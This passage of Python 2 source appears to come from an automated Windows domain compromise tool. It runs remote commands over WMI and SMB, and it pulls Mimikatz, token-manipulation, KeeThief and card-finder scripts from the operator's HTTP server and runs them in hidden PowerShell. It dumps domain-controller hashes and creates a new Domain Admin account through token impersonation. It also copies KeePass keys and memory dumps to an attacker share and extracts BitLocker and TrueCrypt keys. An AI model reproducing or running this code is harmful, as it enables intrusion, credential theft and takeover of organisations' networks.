        print "Password Used By the Below Accounts/Hosts"        
        print tabulate(tmpResultList,headers)


def dumpDCHashes(tmphostno,tmpdomain,tmpusername,tmppassword,tmppasswordHash):
    dumper1 = DumpSecrets(tmphostno, tmpusername, tmppassword, tmppasswordHash, tmpdomain)
    dumper1.dump()
    lines=[]
    time.sleep(10)
    tmpLines1=[]      
    tmpFoundFile=''
    if os.path.exists('secrets.ntds'):
        tmpFoundFile='secrets.ntds'
    elif os.path.exists('secrets.sam'):
        tmpFoundFile='secrets.sam'
    if os.path.exists('secrets.ntds'):
        if tmpFoundFile=='secrets.ntds':
            with open('secrets.ntds') as f:
                lines = f.read().splitlines()
                for x in lines:
                    if not (x.split(":")[0]).endswith("$"):
                        if x not in tmpLines1:
                            tmpLines1.append(x)
            if len(tmpLines1)>0:
                if len(tmpdomain)<1:
                    tmpdomain="WORKGROUP"
                if tmppassword==None:
                    if [tmphostno, tmpdomain, tmpusername, tmppasswordHash] not in accessAdmHostList:
                        accessAdmHostList.append([tmphostno, tmpdomain, tmpusername, tmppasswordHash])                            
                else:
                    if [tmphostno, tmpdomain, tmpusername, tmppassword] not in accessAdmHostList:
                        accessAdmHostList.append([tmphostno, tmpdomain, tmpusername, tmppassword])
                print (setColor("\n[+]", bold, color="green"))+" List of Valid Hashes"
                for x in tmpLines1:
                    print x
                print "\n"
    if os.path.exists('secrets.sam'):
        if tmpFoundFile=='secrets.sam':
            with open('secrets.sam') as f:
                lines = f.read().splitlines()
                for x in lines:
                    if not (x.split(":")[0]).endswith("$"):
                        if x not in tmpLines1:
                            tmpLines1.append(x)
            if len(tmpLines1)>0:
                if len(tmpdomain)<1:
                    tmpdomain="WORKGROUP"
                if tmppassword==None:
                    if [tmphostno, tmpdomain, tmpusername, tmppasswordHash] not in accessAdmHostList:
                        accessAdmHostList.append([tmphostno, tmpdomain, tmpusername, tmppasswordHash])                            
                else:
                    if [tmphostno, tmpdomain, tmpusername, tmppassword] not in accessAdmHostList:
                        accessAdmHostList.append([tmphostno, tmpdomain, tmpusername, tmppassword])                            
                print (setColor("\n[+]", bold, color="green"))+" List of Valid Hashes"
                for x in tmpLines1:
                    print x
                print "\n"
    if os.path.exists('secrets.sam'):
        os.remove('secrets.sam')
    if os.path.exists('secrets.ntds'):
        os.remove('secrets.ntds')
    return tmpLines1

def runRemoteCMD(targetIP,domain,username,password,passwordHash,command):
    if debugMode==True:
        print command
    #results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
    results=runSMBEXEC(targetIP, domain, username, password, passwordHash, command)    
    return results 

def runMimikatz(targetIP,domain,username,password,passwordHash):
    print (setColor("[+]", bold, color="green"))+" Running Mimikatz on Host: "+targetIP
    osArch64=getPowershellVersion(targetIP,domain,username,password,passwordHash)
    powershellPath=getPowershellPath(osArch64)   
    powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
    command=powershellPath+" "+powershellArgs+" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds"    
    results=runWMIEXEC(targetIP, domain, username, password, passwordHash,command) 
    if "The system cannot find the path specified." in results:
        powershellPath="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
        command=powershellPath+" "+powershellArgs+" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds"    
        results=runWMIEXEC(targetIP, domain, username, password, passwordHash,command) 
    if debugMode==True:
        print command
        print results
    tmpPasswordList=parseMimikatzOutput(results)
    if len(tmpPasswordList)>0:
        addPasswords(targetIP,tmpPasswordList)
        if password==None:
            if len(domain)<1:
                domain="WORKGROUP"
            if password!=None:
                if [targetIP, domain, username, password] not in accessAdmHostList:
                    accessAdmHostList.append([ip, str(domain), str(username), str(password)])
        else:
            if len(domain)<1:
                domain="WORKGROUP"
            if password!=None:
                if [targetIP, domain, username, password] not in accessAdmHostList:
                    accessAdmHostList.append([ip, str(domain), str(username), str(password)])
    tmpPasswordList1=[]
    for x in tmpPasswordList:
        tmpDomain=x[0]
        tmpUsername=x[1]
        tmpPassword=x[2]
        tmpPasswordList1.append([targetIP,tmpDomain,tmpUsername,tmpPassword])
    return tmpPasswordList1

def get_ip_address():
    command="ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\\2/p'"
    results = runCommand(command, shell = True, timeout = 15) 
    resultList=results[1].split("\n")
    return resultList[0]

def reverseLookup(ip):
    domainShort=''
    domainFull=''
    domain=""
    command="nmap --script smb-os-discovery.nse -p445 "+ip
    results = runCommand(command, shell = True, timeout = 15) 
    resultList=results[1].split("\n")
    for x in resultList:
        if "|   Domain name: " in x:
            x=x.replace("|   Domain name: ","")
            domain=x
    domainFull=domain
    if domain.count(".")>1:
        domain=domain.split(".")[0]
        domainShort=domain
    return domainShort,domainFull

def powershell_encode(data):
    blank_command = ""
    powershell_command = ""
    n = re.compile(u'(\xef|\xbb|\xbf)')
    for char in (n.sub("", data)):
        blank_command += char + "\x00"
    powershell_command = blank_command
    powershell_command = base64.b64encode(powershell_command)
    return powershell_command

def uploadFile(remoteFilename,localFilename,targetIP, domain, username, password, passwordHash):
    osArch64=getPowershellVersion(targetIP,domain,username,password,passwordHash)
    powershellPath=getPowershellPath(osArch64)
    powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
    command=powershellPath+" "+powershellArgs+" -Command (New-Object System.Net.WebClient).DownloadFile('http://"+myIP+":8000/"+remoteFilename+"', 'C:\\windows\\temp\\"+localFilename+"')"
    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command) 
    if debugMode==True:
        print command
        print results 

def getPowershellPath(osArch64):
    cmd=""
    if osArch64==True:
        cmd="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
    else:
        cmd="C:\\windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
    return cmd

def getPowershellVersion(targetIP,domain,username,password,passwordHash):
    powershellPath='powershell.exe'
    powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
    command=powershellPath+" "+powershellArgs+" -Command $Env:PROCESSOR_ARCHITECTURE"
    try:                    
        results=runWMIEXEC(targetIP, domain, username, password, passwordHash,command)        
        if "AMD64" in results:
            return True
        if "x86" in results:
            return False
    except:
        return True



def tokensPriv(targetIP,domain,username,password,passwordHash):
    global dcCompromised
    global uncompromisedHostList
    osArch64=getPowershellVersion(targetIP,domain,username,password,passwordHash)
    powershellPath=getPowershellPath(osArch64)
    #powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
    powershellArgs='  -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '

    foundUser=''
    dcNetbiosName=''
    tmpSchedName=generateRandomStr()
    tmpFilename=generateRandomStr()+".bat"
    tmpFilename2=generateRandomStr()+".bat"
    tmpFilename3=generateRandomStr()+".bat"
    mimikatzOutputFilename=generateRandomStr()
    (generateRandomStr())+".ps1"
    if len(dcList)>0:
        dcNetbiosName=getNetBiosName(dcList[0])

    command=powershellPath+" "+powershellArgs+" \"IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Invoke-TokenManipulation.ps1\'); Invoke-TokenManipulation\""        
    #results=runWMIEXEC(targetIP, domain, username, password, passwordHash,command)        
    results=runWMIEXEC(targetIP, domain, username, password, passwordHash,command) 
    #results=runPSEXEC(targetIP, domain, username, password, passwordHash,command)        
    if debugMode==True:
        print command
        print results
    resultList=results.split("\n")
    tmpTokenList=[]
    tmpdomain=""
    tmpusername=""    
    for x in resultList:
        if "Domain              : " in x:
            x=x.replace("Domain              : ","") 
            tmpdomain=x.strip()
        if "Username            : " in x:
            x=x.replace("Username            : ","")
            tmpusername=x.strip()
            tmpdomain=tmpdomain.strip()
            tmpusername=tmpusername.strip()
            if len(tmpdomain)>0 and len(tmpusername)>0:
                tmpTokenList.append([tmpdomain,tmpusername])
            tmpdomain=""
            tmpusername=""
    dcDomainNameList=[]
    if len(dcList)>0:
        getDomainAdminUsers(username,password,dcList[0])
        dcDomainNameList=reverseLookup(dcList[0])

    if len(tmpTokenList)>0:
        print (setColor("[+]", bold, color="green"))+" List of Tokens on host: "+targetIP
        headers = ["Domain","Username"]
        tmpPasswordList=[]
        #print (setColor("\nImpersonate Tokens on Host: "+targetIP, bold, color="red"))
        print tabulate(tmpTokenList,headers,tablefmt="simple")
        print "\n"
    
        for x in tmpTokenList:
            tmpDomain=(x[0]).lower()
            tmpUsername=x[1]
            if len(tmpUsername)>0:
                if tmpUsername.lower() in domainAdminList and tmpDomain in dcDomainNameList:
                    foundUser = tmpDomain+"\\"+tmpUsername
                    print (setColor("[+]", bold, color="green"))+" Found Domain Admin Token: '"+foundUser+"'"

                    print "[*] Checking Currently Logged On Users on Host: "+targetIP
                    command=' -Command "Get-WMIObject -class Win32_ComputerSystem | select username"'
                    command=powershellPath+" "+powershellArgs+command
                    #results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    

                    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)
                    #results=runPSEXEC(targetIP, domain, username, password, passwordHash, command)    
                    tmpResultList=results.split("\n")
                    foundStart=False
                    loggedInUsersList=[]
                    for x in tmpResultList:
                        x=x.strip()            
                        if len(x)>0:
                            if foundStart==True:
                                if x not in loggedInUsersList:
                                    loggedInUsersList.append(str(x).lower())  
                                    print str(x).lower()
                            if '--------' in x:
                                foundStart=True
                    #print "[*] UAC is Disabled on Host: "+targetIP
                    print "[*] Attempting to Elevate Privileges Using Token: '"+foundUser+"'"


                    tmpUserList1=[]
                    command="net localgroup administrators"
                    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)
                    tmpResultList=results.split("\n")
                    tmpFound=False
                    for y in tmpResultList:
                        if tmpFound==True:
                            if "The command completed successfully." in y:
                                tmpFound=False
                            else:
                                tmpUserList1.append((str(y).strip()).lower())         
                        if "------------------" in y:
                            tmpFound=True

                    impersonateUser=''
                    if len(tmpUserList1)>0:
                        print (setColor("[*]", bold, color="green"))+" List of Users in Administrators Group on Host: "+ip
                        for y in tmpUserList1:
                            print y

                        for user1 in loggedInUsersList:
                            if (str(user1).lower()).strip() in tmpUserList1:
                                print (setColor("[+]", bold, color="green"))+" Is '"+str(user1).lower()+"' in 'Administrators' group on Host "+ip+" "+(setColor("Yes", bold, color="green"))
                                impersonateUser=str(user1).lower()
                            else:
                                print "[-] Is '"+str(user1).lower()+"' in 'Administrators' group on Host "+ip+" "+(setColor("No", bold, color="no"))

                    if len(impersonateUser)>0:                        
                        print (setColor("[+]", bold, color="green"))+" Adding new Domain Admin Account to Host: "+ip
                        target = open(tmpFilename3, 'w')
                        cmd = 'net user /add '+tmpCreateDAUsername+' "'+tmpCreateDAPassword+'" /domain'
                        target.write(cmd+"\r\n")
                        cmd = 'net group "Domain Admins" '+tmpCreateDAUsername+' /add /domain'
                        target.write(cmd+"\r\n")
                        target.close()
                        uploadFile(tmpFilename3,tmpFilename3,targetIP, domain, username, password, passwordHash)

                        s='IEX (New-Object Net.WebClient).DownloadString(\'http://'+myIP+':8000/Invoke-TokenManipulation.ps1\');Invoke-TokenManipulation -CreateProcess \'cmd.exe\' -Username '+foundUser+' -ProcessArgs \'/c C:\\windows\\TEMP\\'+tmpFilename3+'\''
                        #encodedPS=powershell_encode(s)
                        cmd = powershellPath+" -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass  "+s
                        if debugMode==True:
                            print cmd
                        target = open(tmpFilename2, 'w')
                        target.write(cmd)
                        target.close()
                        uploadFile(tmpFilename2,tmpFilename2,targetIP, domain, username, password, passwordHash)

                        command='schtasks.exe /Delete /TN '+tmpSchedName+' /f'
                        results=runPSEXEC(targetIP, domain, username, password, passwordHash, command)    
                        if debugMode==True:
                            print command
                            print results

                        command='schtasks.exe /Create /RL HIGHEST /RU '+impersonateUser+' /TN '+tmpSchedName+' /SC MONTHLY /M DEC /TR "'"C:\\windows\\temp\\"+tmpFilename2+"\""
                        results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
                        if debugMode==True:
                            print command
                            print results
                        print "[*] Running Tasks on Host: "+targetIP
                        command='schtasks /Run /TN '+tmpSchedName    
                        results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
                        if debugMode==True:
                            print command
                            print results
                        checkComplete=False
                        while checkComplete==False:
                            command='schtasks /Query /TN '+tmpSchedName
                            results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)            
                            if debugMode==True:
                                print command
                                print results
                            tmpResultList=results.split("\n")
                            for x in tmpResultList:
                                if tmpSchedName in x:
                                    if "Ready" in x or "Running" in x:
                                        if "Ready" in x:
                                            print "[*] Removing Tasks from Host: "+targetIP
                                            command='schtasks.exe /Delete /TN '+tmpSchedName+' /f'                
                                            runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
                                            checkComplete=True
                                        if "Running" in x:
                                            time.sleep(10)
                        if dcCompromised==False:
                            if len(dcList)>0:
                                isDA=getDomainAdminUsers(tmpCreateDAUsername,tmpCreateDAPassword,dcList[0])
                                if isDA==True:
                                    domainShort,domainFull=reverseLookup(dcList[0])
                                    print (setColor("\nDumping Plaintext Credentials from Domain Controller: "+ip, bold, color="green"))
                                    tmpPasswordList=runMimikatz(dcList[0],domainShort,tmpCreateDAUsername,tmpCreateDAPassword,None)    
                                    for y in tmpPasswordList:
                                        if y not in userPassList:
                                            userPassList.append(y)

                                    print (setColor("\nDumping Hashes from Domain Controller: "+dcList[0], bold, color="green"))
                                    tmpHashList=dumpDCHashes(dcList[0],domainShort,tmpCreateDAUsername,tmpCreateDAPassword,None)    
                                    if len(tmpHashList)>0:
                                        addHashes(dcList[0],tmpHashList)
                                        if dcList[0] in uncompromisedHostList:
                                            uncompromisedHostList.remove(dcList[0])
                                        analyzeHashes(tmpHashList)
                                    dcCompromised=True



def generateRandomStr():
 chars = string.letters + string.digits
 pwdSize = 20
 return ''.join((random.choice(chars)) for x in range(pwdSize))

def listUsers(targetIP,domain,username,password,passwordHash):
    command='dir.exe C:\Users /b /ad'
    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
    tmpResultList=results.split("\n")
    tmpResultList1=[]
    for x in tmpResultList:
        x=x.strip()
        if "File Not Found"!=x and "All Users"!=x and "Default"!=x and "Default User"!=x and "Public"!=x:
            if len(x)>0:
                tmpResultList1.append(x)
    return tmpResultList1

def listProcesses(targetIP,domain,username,password,passwordHash):
    command=powershellCmdStart+" -Command \"get-process | select name\""
    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
    tmpResultList1=[]
    found=False
    tmpResultList=results.split("\n")
    for x in tmpResultList:
        x=x.strip()   
        if found==True:
            #if x not in tmpResultList1:
            tmpResultList1.append(x)     
        if x=="----" :
            found=True
    return tmpResultList1

def sessionGopher(targetIP,domain,username,password,passwordHash):
    #command=powershellCmdStart+' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/SessionGopher.ps1\',\'%temp%\SessionGopher.ps1\'); . %temp%\SessionGopher.ps1; Invoke-SessionGopher -Thorough"'
    command=powershellCmdStart+' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/SessionGopher.ps1\',\'%temp%\SessionGopher.ps1\'); . %temp%\SessionGopher.ps1; Invoke-SessionGopher"'
    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
    if debugMode==True:
        print command
    tmpResultList=results.split("\n")
    for x in tmpResultList:
        if len(x.strip())>0:
            if "FileZilla Sessions" in x or "WinSCP Sessions" in x or "SuperPuTTY Sessions" in x or "PuTTY Sessions" in x or "Microsoft RDP Sessions" in x or "PuTTY Private Key Files (.ppk)" in x or "Microsoft RDP Connection Files (.rdp)" in x or "RSA Tokens (sdtid)" in x or "Microsoft Remote Desktop (RDP) Sessions" in x:
                print "\n"
            print x
    return results
'''
def getCurrentUsers(targetIP,domain,username,password,passwordHash):
    loggedInUsersList=[]
    osArch64=getPowershellVersion(targetIP,domain,username,password,passwordHash)
    powershellPath=getPowershellPath(osArch64)
    command = ' -Command "Get-WmiObject Win32_LoggedOnUser | Select Antecedent -Unique"'
    command=powershellPath+" "+powershellArgs+command
    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
    print results
    os._exit(1)
'''

def getCurrentUsers(targetIP,domain,username,password,passwordHash):
    loggedInUsersList=[]
    osArch64=getPowershellVersion(targetIP,domain,username,password,passwordHash)
    powershellPath=getPowershellPath(osArch64)
    command=' -Command "Get-WMIObject -class Win32_ComputerSystem | select username"'
    command=powershellPath+" "+powershellArgs+command
    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
    tmpResultList=results.split("\n")
    foundStart=False
    loggedInUsersList=[]
    for x in tmpResultList:
        x=x.strip()            
        if len(x)>0:
            if foundStart==True:
                if x not in loggedInUsersList:
                    loggedInUsersList.append(x)                            
            if '--------' in x:
                foundStart=True
    if len(loggedInUsersList)>0:
        print "[*] Currently Logged In Users"
        for x in loggedInUsersList:
            print x
    return loggedInUsersList

def getKeepass(targetIP,domain,username,password,passwordHash):
    tmpResultList=[]
    tmpSchedName=generateRandomStr()
    batFilename=generateRandomStr()+".bat"
    osArch64=getPowershellVersion(targetIP,domain,username,password,passwordHash)
    powershellPath=getPowershellPath(osArch64)

    tmpProcessList=listProcesses(targetIP,domain,username,password,passwordHash)
    if "KeePass" in tmpProcessList:
        tmpCurrentUser=getCurrentUsers(targetIP,domain,username,password,passwordHash)
        #cmd=powershellPath+" "+powershellArgs+" \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1'); Get-KeePassDatabaseKey | Select-Object Database,Plaintext | Out-File \\\\"+myIP+"\\guest\\"+targetIP+"_keepass.txt\""
        cmd=powershellPath+" "+powershellArgs+" \"IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/KeeThief.ps1\'); Get-KeePassDatabaseKey | Select-Object Database,Plaintext | Out-File \\\\"+myIP+"\\guest\\"+targetIP+"_keepass.txt\""
        target = open(batFilename, 'w')
        target.write(cmd)
        target.close()
        uploadFile(batFilename,batFilename,targetIP, domain, username, password, passwordHash)
        #print "[*] Scheduling Tasks on Host: "+targetIP
        command='schtasks.exe /Delete /TN '+tmpSchedName+' /f'
        results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
        tmpusername=tmpCurrentUser[0].split("\\")[1]
        tmpdomain=tmpCurrentUser[0].split("\\")[0]
        command='schtasks.exe /Create /RL HIGHEST /RU '+tmpdomain+'\\'+tmpusername+' /TN '+tmpSchedName+' /SC MONTHLY /M DEC /TR "'"C:\\windows\\temp\\"+batFilename+"\""
        results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)   
        if debugMode==True:
            print command
            print results
        command='schtasks /Run /TN '+tmpSchedName    
        results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
        if debugMode==True:
            print command
            print results
        checkComplete=False
        while checkComplete==False:
            command='schtasks /Query /TN '+tmpSchedName
            results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)            
            if debugMode==True:
                print command
                print results
            if "Ready" in str(results):
                command='schtasks.exe /Delete /TN '+tmpSchedName+' /f'                
                runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
                checkComplete=True
            else:
                time.sleep(10)
        time.sleep(2)
        tmpFilename=origScriptPath+"/loot/"+targetIP+'_keepass.txt'
        if os.path.exists(tmpFilename):
            #tmpFilename1=convertWinToLinux(tmpFilename)
            #copyfile(tmpFilename1, tmpFilename)
            #os.remove(tmpFilename1)
            with open(tmpFilename) as f:
                content = f.readlines()     
                tmpFound=False                    
                tmpCount=0
                for y in content:
                    y=str(y).strip()
                    if tmpCount>2:
                        if len(y)>3:
                            if y not in tmpResultList:
                                tmpResultList.append(y)       
                    tmpCount+=1
    return tmpResultList

def getTruecrypt(targetIP,domain,username,password,passwordHash):
    '''
    #Additional profiles for volatility
    Win7SP1x86
    Win10x64
    Win10x86
    Win2008R2SP1x64
    Win2012R2x64
    Win7SP1x86
    Win7SP1x64
    Win8SP1x64
    '''
    tmpResultList1=[]
    osArch64=getPowershellVersion(targetIP,domain,username,password,passwordHash)
    powershellPath=getPowershellPath(osArch64)
    powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
    tmpProcessList=listProcesses(targetIP,domain,username,password,passwordHash)
    if "TrueCrypt" in tmpProcessList:
        s="""
        $driveinfo=get-wmiobject win32_volume | where { $_.driveletter -eq 'C:' } | select-object freespace, capacity, drivetype, driveletter
        $WarningLevel=$driveinfo.freespace/(1024*1024*1024)
        if ($WarningLevel -gt 5)
        {
            $sOS =Get-WmiObject -class Win32_OperatingSystem 
            #$sOS | Select-Object Description, Caption, OSArchitecture, ServicePackMajorVersion
            (New-Object Net.WebClient).DownloadFile('http://%s:8000/DumpIt.exe','C:\\windows\\temp\\DumpIt.exe')
            $ip=get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
            $newFilename="%s_memory_"+$sOS.Version+"_"+$sOS.OSArchitecture +"_"+$sOS.ServicePackMajorVersion +".raw"
            #$newFilename=$ip.ipaddress[0]+"_memory_"+$sOS.Version+"_"+$sOS.OSArchitecture +"_"+$sOS.ServicePackMajorVersion +".raw"
            Write-Output $newFilename
            $exe = &"C:\\windows\\temp\\DumpIt.exe" "/Q" "/O" "c:\\windows\\temp\\$($newFilename)"
            $exe
            Move-Item -Path "C:\\windows\\temp\\$($newFilename)" -Destination "\\\\%s\\guest\\$($newFilename)"
        }""" % (myIP,targetIP,myIP)
        encodedPS=powershell_encode(s)
        command=powershellPath+" "+powershellArgs+" -ec "+encodedPS
        if debugMode==True:
            print s
            print command
        results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
        tmpFileList=glob.glob(origScriptPath+"/loot/"+targetIP+"_memory_*.raw")
        for filename in tmpFileList:
            tmpIP=filename.split("_")[0]
            tmpVer=filename.split("_")[2]
            tmpArch=filename.split("_")[3]
            tmpSP=(filename.split("_")[4]).split(".raw")[0]
            if tmpArch=="64-bit":
                tmpArch="x64"
            if tmpArch=="32-bit":
                tmpArch="x32"
            if tmpVer=="6.1.7601":
                tmpVer="Win7"
            if tmpSP=="1":
                tmpSP="SP1"
            volProfile=tmpVer+tmpSP+tmpArch
            cmd = "python "+pathVolatility+"/vol.py -f "+filename+" --profile="+volProfile+" truecryptmaster"            
            cmdList=cmd.split(" ")
            resultList=subprocess.check_output(cmdList)
            if debugMode==True:
                print cmd
                print resultList
            tmpResultList=resultList.split("\n")
            found=False
            for x in tmpResultList:
                if found==True:
                    print x
                if "Master Key" in x:
                    found=True


def getBitlockerKeys(targetIP,domain,username,password,passwordHash):
    tmpResultList=[]
    osArch64=getPowershellVersion(targetIP,domain,username,password,passwordHash)
    powershellPath=getPowershellPath(osArch64)
    powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
    command=powershellPath+" "+powershellArgs+" -Command \"Get-BitLockerVolume |  Select-Object MountPoint,VolumeStatus\""
    if debugMode==True:
        print command
    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
    if "FullyEncrypted" in str(results):
        command=powershellPath+" "+powershellArgs+" -Command \"(Get-BitLockerVolume -MountPoint C).KeyProtector.recoverypassword\""
        if debugMode==True:
            print command
        results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
        tmpResultList=results.split("\n")
        return tmpResultList
    else:
        return tmpResultList

def memCredDump(targetIP,domain,username,password,passwordHash,processName):
    command=powershellCmdStart+' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/mem_scraper.ps1\',\'%temp%\mem_scraper.ps1\');%temp%\mem_scraper.ps1 -Proc '+processName+'"'
    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
    tmpResultList=results.split("\n")
    return tmpResultList

def diskCredDump(targetIP,domain,username,password,passwordHash):
    tmpResultList1=[]
    osArch64=getPowershellVersion(targetIP,domain,username,password,passwordHash)
    powershellPath=getPowershellPath(osArch64)
    powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
    s="GET-WMIOBJECT -query \"SELECT * from win32_logicaldisk where DriveType = '3'\" | Select-Object DeviceID | ft -HideTableHeaders"
    encodedPS=powershell_encode(s)
    command = powershellPath+" -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass -ec "+encodedPS
    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
    tmpResultList=results.split("\n")
    tmpDriveList=[]    
    for x in tmpResultList:
        x=x.strip()
        if len(x)>0:
            tmpDriveList.append(x)
    if len(tmpDriveList)>0:
        if "The system cannot find the path specified" not in str(tmpDriveList):
            print "[*] Fixed Disks found on host: "+" ".join(tmpDriveList)
        #print "\n"
    for driveNo in tmpDriveList:
        command=powershellCmdStart+' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
        results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
        if debugMode==True:
            print command
            print results
        tmpResultList=results.split("\n")
        for x in tmpResultList:
            tmpResultList1.append(x)
    return tmpResultList1
    
def listRemoteShare(targetIP,domain, username, password):

    deniedList = []
    allowedList = []
    conn = SMBConnection1(username,password,client_machine_name,targetIP,domain=domain,use_ntlm_v2=True,is_direct_tcp=True)
    conn.connect(targetIP, 445)  
    folderDepth=3
    try:
        shares = conn.listShares()
        for x in shares:
            try:
                shareName = x.name
                if shareName != 'ADMIN$':
                    count=0
                    subDirectory=""
                    subDirectoryList=[]
                    tmpsubDirectoryList=[]
                    while count<int(folderDepth):
                        if count==0:
                            sharedfiles = conn.listPath(shareName, '/'+subDirectory)
                            for y in sharedfiles:
                                if y.filename != '.' and y.filename != '..' and y.isDirectory==True and y.filename!='Windows' and y.filename!='Boot' and y.filename!='Public':
                                #if y.filename != '.' and y.filename != '..' and y.isDirectory==True:
                                    subDirectoryList.append(y.filename)
                                    try:
                                        conn.listPath(shareName, '/'+y.filename)
                                        #names = conn.listPath(shareName, '/' + y.filename)
                                        if [targetIP, username, password,shareName + '/' + y.filename] not in allowedList:
                                            allowedList.append([targetIP,username, password, shareName + '/' + y.filename])
                                    except:
                                        if [targetIP, username, password, shareName + '/' + y.filename] not in deniedList:
                                            deniedList.append([targetIP, username, password, shareName + '/' + y.filename])

                        else:
                            tmpsubDirectoryList = subDirectoryList
                            subDirectoryList=[]
                            for z in tmpsubDirectoryList:
                                try:                                    
                                    if not z.startswith("/"):
                                        sharedfiles = conn.listPath(shareName, '/'+z)   
                                    else:
                                        sharedfiles = conn.listPath(shareName, z)   
                                    for g in sharedfiles:        
                                        #print g.filename
                                        if g.filename != '.' and g.filename != '..' and g.isDirectory==True:   
                                            subDirectoryList.append(z+"/"+g.filename)
                                            #subDirectoryList.append("/"+z+"/"+g.filename)
                                            try:                                                                                                
                                                conn.listPath(shareName, '/'+  z + "/" + g.filename)
                                                if [targetIP, username, password,shareName + '/' +  z + "/" + g.filename] not in allowedList:
                                                    allowedList.append([targetIP,username, password, shareName + '/' + z + "/" + g.filename])
                                            except:
                                                if [targetIP, username, password, shareName + '/' + z + "/" + g.filename] not in deniedList:
                                                    deniedList.append([targetIP, username, password, shareName + '/' + z + "/" + g.filename])
                                except Exception as e:
                                    continue

                        count+=1
            except Exception as e:
                continue
    except Exception as e:
        if "Failed to list shares: Unable to connect to IPC$" in e:
            print "[Error] Failed to list shares: Unable to connect to IPC$"
        else:
            print e
    return (allowedList, deniedList)

def getInstalledPrograms(targetIP,domain,username,password,passwordHash):
    osArch64=True
    osArch64=getPowershellVersion(targetIP,domain,username,password,passwordHash)    
    powershellPath=getPowershellPath(osArch64)
    powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
    #command=powershellPath+" "+powershellArgs+" -command \"(Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Format-Table –AutoSize)\""
    command=powershellPath+" "+powershellArgs+" -command \"Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName\""
    if debugMode==True:   
        print command
    results=runWMIEXEC(targetIP,domain,username,password,passwordHash,command)
    #results=runRemoteCMD(targetIP,domain,username,password,passwordHash,command)
    tmpResultList1=[]
    if "FullyQualifiedErrorId" not in str(results):
        count=0
        tmpResultList=results.split("\n")
        for x in tmpResultList:
            x=x.strip()
            if count>2 and len(x)>0:  
                tmpResultList1.append([targetIP,x])         
            count+=1
        return tmpResultList1
    else:
        return []

def readRemoteRegistry(targetIP,domain,username,password,passwordHash,keyPath,selectedKey):
    regHandler = RegHandler(targetIP,domain,username,password,passwordHash,keyPath,selectedKey)
    try:
        (results, status) = regHandler.run(targetIP, targetIP)
        if 'ERROR_FILE_NOT_FOUND' in results:
            if passwordHash != None:
                tmpRegResultList2.append([targetIP,'Missing Key',username,passwordHash,keyPath + '\\' + selectedKey,None])
            else:
                tmpRegResultList2.append([targetIP,'Missing Key',username,password,keyPath + '\\' + selectedKey,None])
        if 'Invalid root key HKCU' in results:
            tmpRegResultList2.append([targetIP, 'Missing Key', keyPath + '\\' + selectedKey, None])
        if status == True:
            return results
    except Exception, e:
        print e

